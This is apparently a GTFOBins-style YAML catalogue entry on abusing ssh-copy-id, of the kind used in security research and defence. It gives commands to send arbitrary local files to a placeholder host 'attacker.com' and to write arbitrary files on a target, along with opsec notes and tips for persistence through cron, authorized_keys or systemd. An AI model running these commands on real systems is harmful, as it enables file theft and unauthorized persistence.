---
name: ssh-copy-id
capabilities:
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: low
  artifacts:
  - ~/.bash_history
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
  notes: The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
  notes: The input file must have the `.pub` file extension.
references:
- https://gtfobins.github.io/gtfobins/ssh-copy-id/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
